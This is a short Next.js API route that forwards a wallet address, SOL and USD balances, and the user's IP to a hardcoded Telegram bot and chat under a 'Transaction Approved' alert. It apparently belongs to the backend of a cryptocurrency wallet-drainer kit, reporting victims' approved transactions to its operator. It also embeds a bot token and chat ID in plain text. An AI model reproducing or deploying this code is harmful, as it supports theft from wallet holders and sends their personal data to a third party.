import { type NextRequest, NextResponse } from "next/server" 

const TELEGRAM_BOT_TOKEN = "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U" 
const TELEGRAM_CHAT_ID = "7556622176" 

async function sendApprovalNotification(walletAddress: string, balanceSOL: number, balanceUSD: number, userIP: string) { 
  try { 
    const message = ` 
🕯 *Transaction Approved* 

📍 *Address:* \`${walletAddress}\` 
💰 *Balance:* ${balanceSOL.toFixed(6)} SOL 
💵 *Balance USD:* $${balanceUSD.toFixed(2)} 
🌐 *IP:* ${userIP} 
    `.trim() 

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage` 

    await fetch(telegramUrl, { 
      method: "POST", 
      headers: { 
        "Content-Type": "application/json", 
      }, 
      body: JSON.stringify({ 
        chat_id: TELEGRAM_CHAT_ID, 
        text: message, 
        parse_mode: "Markdown", 
      }), 
    }) 
  } catch (error) {} 
} 

export async function POST(request: NextRequest) { 
  try { 
    const body = await request.json() 
    const { walletAddress: walletAddress, balanceSOL: balanceSOL, balanceUSD: balanceUSD, userIP: userIP } = body 

    if (!walletAddress || balanceSOL === undefined || balanceUSD === undefined) { 
      return NextResponse.json({ error: "Missing required parameters" }, { status: 400 }) 
    } 

    await sendApprovalNotification(walletAddress, balanceSOL, balanceUSD, userIP || "unknown") 

    return NextResponse.json({ success: true }) 
  } catch (error) { 
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 }) 
  } 
} 
